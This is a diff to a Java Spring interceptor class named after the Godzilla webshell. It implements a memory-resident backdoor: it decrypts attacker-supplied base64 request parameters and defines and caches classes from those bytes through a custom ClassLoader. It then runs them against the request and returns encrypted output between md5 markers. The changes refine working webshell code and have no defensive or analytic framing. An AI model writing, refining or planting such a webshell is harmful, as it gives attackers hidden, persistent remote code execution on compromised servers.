@@ -21,11 +21,11 @@ public class GodzillaInterceptor extends ClassLoader implements AsyncHandlerInte
     public static String headerName;
     public static String headerValue;
 
-    public GodzillaInterceptor(ClassLoader c) {
-        super(c);
+    public GodzillaInterceptor() {
     }
 
-    public GodzillaInterceptor() {
+    public GodzillaInterceptor(ClassLoader c) {
+        super(c);
     }
 
     @Override
@@ -35,27 +35,23 @@ public class GodzillaInterceptor extends ClassLoader implements AsyncHandlerInte
                 HttpSession session = request.getSession();
                 byte[] data = base64Decode(request.getParameter(pass));
                 data = this.x(data, false);
-                if (session.getAttribute("payload") == null) {
-                    session.setAttribute("payload", (new GodzillaInterceptor(this.getClass().getClassLoader())).Q(data));
+                Object cache = session.getAttribute(key);
+                if (cache == null) {
+                    session.setAttribute(key, (new GodzillaInterceptor(Thread.currentThread().getContextClassLoader())).Q(data));
                 } else {
-                    request.setAttribute("parameters", data);
                     ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                    Object f;
-                    try {
-                        f = ((Class<?>) session.getAttribute("payload")).newInstance();
-                    } catch (Exception e) {
-                        throw new RuntimeException(e);
-                    }
+                    Object f = ((Class<?>) cache).newInstance();
                     f.equals(arrOut);
                     f.equals(request);
-                    response.getWriter().write(md5.substring(0, 16));
+                    f.equals(data);
                     f.toString();
+                    response.getWriter().write(md5.substring(0, 16));
                     response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                     response.getWriter().write(md5.substring(16));
                 }
                 return false;
             }
-        } catch (Exception e) {
+        } catch (Throwable e) {
             e.printStackTrace();
         }
         return true;
@@ -80,18 +76,15 @@ public class GodzillaInterceptor extends ClassLoader implements AsyncHandlerInte
             Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Encoder");
-                Object encoder = base64.newInstance();
-                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Encoder");
+            Object encoder = base64.newInstance();
+            value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
         }
         return value;
     }
 
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
+    public static byte[] base64Decode(String bs) throws Exception {
         byte[] value = null;
         Class<?> base64;
         try {
@@ -99,12 +92,9 @@ public class GodzillaInterceptor extends ClassLoader implements AsyncHandlerInte
             Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
         return value;
     }
